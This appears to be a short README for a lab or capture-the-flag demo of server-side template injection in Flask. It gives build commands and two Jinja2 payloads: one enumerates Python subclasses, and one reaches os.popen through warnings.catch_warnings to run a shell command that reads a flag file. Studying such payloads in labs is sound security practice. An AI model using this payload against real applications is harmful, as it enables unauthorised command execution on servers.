## Flask Server-Side Template Injection Demo

## Build
```
make run
make flask-app
python blog.py
```

### Get all classes
```
{{().__class__.__base__.__subclasses__()}}
```

### Use warnings.catch_warnings 
```
{{().__class__.__base__.__subclasses__()[308]()._module.__builtins__["__import__"]("os").popen("cat flag.txt").read()}}
```
